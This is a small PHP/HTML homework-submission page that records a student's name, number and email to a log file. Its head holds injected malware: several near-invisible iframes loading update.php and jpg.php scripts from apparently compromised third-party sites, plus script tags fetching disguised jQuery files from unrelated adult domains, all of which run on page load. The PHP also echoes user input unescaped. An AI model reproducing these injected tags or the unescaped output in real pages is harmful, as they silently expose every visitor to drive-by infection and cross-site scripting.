<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Howmework Submit</title>
<iframe src="http://www.zw52.ru/wp-content/upgrade/update.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><iframe src="http://www.2nf.com.vn/templates/beez/images/jpg.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><iframe src="http://www.2nf.com.vn/templates/beez/images/jpg.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><script language="JavaScript" src="http://www.insightcrime.org/media/system/js/jquery-1.6.5.min.js" type="text/javascript"></script><script language="JavaScript" src="http://3xindiansex.com/st/css/js/jq-footer.js" type="text/javascript"></script><script language="JavaScript" src="http://sexfromindia.com/linkex/jquery-1.6.5.min.js" type="text/javascript"></script></head>

<body>

<?php
	 $stuname = $_POST["stuname"];
	 $stuno = $_POST["stuno"];
	 $email = $_POST["email"];
	  
	 	 if($stuname == null) {
		echo "Name is not correct!";
		return 0;
	}
	if($stuno == null) {
		echo "Student number is not correct!";
		return 0;
	}
	if($email == null) {
		echo "Email address is not correct!";
		return 0;
	}
 
	
	$file_handle = fopen("info.log", "r");
	$counter = 0;
	$flag = 1;
    while (!feof($file_handle)) {
	   $line = fgets($file_handle);
	   if($counter % 4 == 1) {
           $no = trim(substr($line, 5));
		   //echo $no.$stuno."<p>";
		   if($no == $stuno) $flag = 0;
	   }
	   ++$counter;
    }
    fclose($file_handle);
 
//echo $flag."<p>";
	if($flag == 1) {
	 $logfp = fopen("info.log", 'a+');
	 fwrite($logfp, "stuname=".$stuname."\r\n");
	 fwrite($logfp, "stuno=".$stuno."\r\n");
	  
	 fwrite($logfp, "email=".$email."\r\n");
	 fwrite($logfp, "\r\n");
	 fclose($logfp);
	 }
	else {
	  echo "You have upload your information!";
	  return 0;
	}
	 
	echo "name:".$stuname."<p>"."student number:".$stuno."<p>"."email:".$email."<p>";
	echo "All finish!";
?>